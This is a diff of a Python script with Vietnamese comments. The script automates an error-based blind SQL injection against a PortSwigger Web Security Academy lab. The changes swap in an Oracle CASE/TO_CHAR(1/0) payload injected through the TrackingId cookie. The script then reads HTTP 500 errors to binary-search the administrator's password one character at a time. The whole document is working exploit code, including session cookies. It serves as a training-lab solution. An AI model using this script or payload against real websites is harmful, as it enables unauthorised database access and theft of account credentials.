@@ -3,23 +3,24 @@ from termcolor import colored
 
 alphanumeric = '0123456789abcdefghijklmnopqrstuvwxyz'
 #target tự điền
-target = "https://0a5b00ae0381ef4a81a4e3e6007700f9.web-security-academy.net/"
+target = "https://0a7c0012034c199f80c6083d000800f0.web-security-academy.net/"
 success_indicator = "Welcome back"
 password = ""
 password_length = 20 #password length cũng tự điền
 
+#payload : "'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
 print(colored("[i] Trích xuất mật khẩu (Binary Search):", "blue"))
 
 
 def is_greater_than(position, char):
-    payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')>'{char}"
-    
-    headers = { #cookie trackingid và session tự điền
-        "Cookie": f"TrackingId=S7ZJnmWxEBEFmZU7{payload}; session=u06T3yD3vGgSwjb74H7y3ACWvhOZtfNc"
+    payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)>'{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+    headers = { 
+        "Cookie": f"TrackingId=RzHLK4UdejBOBAv4{payload}; session=oTlUogfkNbLYZ2aLbGo12EKAE7TYMZg3"
     }
 
     response = requests.get(target, headers=headers)
-    return success_indicator in response.text
+    # Nếu Web lỗi 500 (Tức là điều kiện '>' đúng, dẫn đến chia cho 0) -> trả về True
+    return not (response.status_code == 200)
 
 
 def find_char_at_position(position):
@@ -40,7 +41,6 @@ def find_char_at_position(position):
     return alphanumeric[low]
 
 
-# ================= MAIN =================
 for position in range(1, password_length + 1):
     char = find_char_at_position(position)
     password += char
